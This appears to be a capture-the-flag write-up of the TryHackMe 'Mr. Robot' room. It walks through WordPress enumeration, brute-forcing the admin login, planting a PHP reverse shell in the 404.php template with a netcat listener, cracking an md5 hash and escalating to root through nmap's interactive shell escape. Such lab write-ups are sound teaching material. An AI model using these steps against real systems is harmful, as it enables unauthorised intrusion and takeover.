---
layout: default
discription: Amar1337
title: TryHackMe: Mr. Robot Writeup
---

<center> 
    <big>Mr-Robot</big>
</center>

<center>
    <img src="https://i.pinimg.com/originals/16/d5/28/16d52826e9a8f0e24faa4b1037efe808.jpg">
</center>

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

*   Information
*   name: <p1> Mr.Robot </p1>
*   OS: <p1> Linux </p1>
*   Difficulty: <p1 style="color:green;">Easy</p1>
*   <a href=" https://tryhackme.com/room/mrrobot">Room</a>

- Discription:
    - <p2> This is my second time doing this BOX, it is very interesting and easy</p2>
    - <p2> I recommend it to everyone who has watched the <a href="https://www.imdb.com/title/tt4158110/">Mr.Robot series</a></p2>

## Summary
- Enumerating **80** port with <a href="https://github.com/OJ/gobuster">GoBuster</a>.
- Brute forcing **WP** with <a href="https://github.com/vanhauser-thc/thc-hydra">Hydra</a>.
- Reverse shell through **404.php**.
- Cracking **md5** password.
- Loggin as **robot** and privilege escalation to **root**.

# <big>`nmap`</big>

```js
root@kali:~# nmap -sC -sV 10.10.145.82
Nmap scan report for 10.10.145.82
Host is up (0.17s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
```

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# <big>`First Key`</big>

<br><big> * On **80** port we got cool webpage but nothing useful. </big>
<br><big> * So i started enumeration.</big><br> 

      gobuster dir 10.10.116.11 /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

<br><big> * After some time we got webpage called **blog**, so we found **WP** and let's go **/wp-admin.php**.
<br><big> * Lets do **users** enumeration</big>

    wpscan --url 10.10.116.11 --enumerate u

<br><big> * After some time we got one user **Elliot** </big>
<br><big> * When we look **/robots.txt** we got something really useful</big>

    User-agent: *
    fsocity.dic
    key-1-of-3.txt

<br><big> * We got first key </big>

# <big>`Second Key`</big>

<big> * When we look **/fsocity.dic** its basically **wordlist** </big>
<br><big> * Let's download **wordlist** and try to use on **WP login** </big>

    wget http://10.10.116.11/fsocity.dic

<br><big> * Before we do **brute force** on **WP** lets remove special characters from **wordlist**

    sort fsocity.dic | uniq > fsocity-sorted.dic

<br><big> * Now lets perform **brute force** on **WP login** </big>

    wpscan --url 10.10.116.11 --wp-content-dir wp-admin --usernames elliot --passwords ~/Downloads/fsocity-sorted.dic

<br><big> * After 2 minutes i got password

<img src="https://i.imgur.com/uKLn2Vi.jpg">

<br><big> * Let's login </big>
<br><big> * Theme is **Twenty Fifteen** so let's do reverse shell</big>
<br><big> * Go to **Appearance** > **Editor** and choose **404.php**
<br><big> * I will use <a href="https://github.com/pentestmonkey/php-reverse-shell">**PentestMonkey**</a> reverse shell so i recommended to use this reverse shell</big>

<img src="https://i.imgur.com/SubjHNg.png">

<br><big> * Make sure listener is on (**nc -lvnp port**)</big>
<br><big> * Now go to the page **http://10.10.116.11/wp-content/themes/twentyfifteen/404.php**</big> 
<br><big> * And boom we have a **shell** as **dameon** </big>

<img src="https://i.imgur.com/5vXAQnh.png">

<br><big> * Let's upgrade shell </big>

    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm

<br><big> * After a while i found **md5-password** in **/home/robot/** i can **read it**</big>
<br><big> * Lets try to **crack** it and login as **robot** </big>
<br><big> * You can use <a href="https://github.com/openwall/john">John</a> to **crack** it but i will use **webpage** <a href="https://crackstation.net/">CrackStation</a>, just copy paste :)

<img src="https://i.imgur.com/YcFpN6U.jpg">

<br><big> * We can't **ssh** so let's just try to use **su robot** </big>
<br><big> * And we are in, now we can read **key number 2** </big>

# <big>`Privilege escalation to root (third key)`</big>

<br><big> * Let's try to use command **find** to escalate to **root** </big>

    find / -perm -u=s -type f 2>/dev/null

<img src="https://i.imgur.com/jB7U7Ps.png">

<br><big> * And we can see nmap so lets try to get **root** through **interactive** mode

    nmap --interacive
    !sh

<br><big> * And as you can see we are **root** so we can take **third key**

<img src="https://i.imgur.com/OvCYnug.png">

<big> Amar#0484 </big>

## [Back to main page](./../..)
